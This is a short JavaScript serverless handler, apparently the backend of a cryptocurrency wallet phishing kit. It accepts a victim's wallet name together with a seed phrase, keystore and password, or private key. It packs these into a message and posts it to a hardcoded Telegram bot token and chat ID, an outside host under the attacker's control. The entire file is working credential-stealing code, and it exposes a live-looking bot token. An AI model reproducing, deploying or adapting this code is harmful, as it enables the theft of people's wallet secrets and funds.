export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Only POST requests allowed' });
  }

  const botToken = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI';
  const chatId = '1129243973';
  const { type, walletName, phrase, keystore, password, privateKey } = req.body;

  let message = `🟡 Wallet: ${walletName}\n`;

  switch (type) {
    case 'phrase':
      message += `🔑 Phrase:\n${phrase}`;
      break;
    case 'keystore':
      message += `📁 Keystore:\n${keystore}\n🔒 Password: ${password}`;
      break;
    case 'privatekey':
      message += `🔐 Private Key:\n${privateKey}`;
      break;
    default:
      return res.status(400).json({ message: 'Invalid type' });
  }

  const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    const data = await response.json();
    if (!data.ok) throw new Error(data.description);

    return res.status(200).json({ message: 'Sent to Telegram successfully' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
}
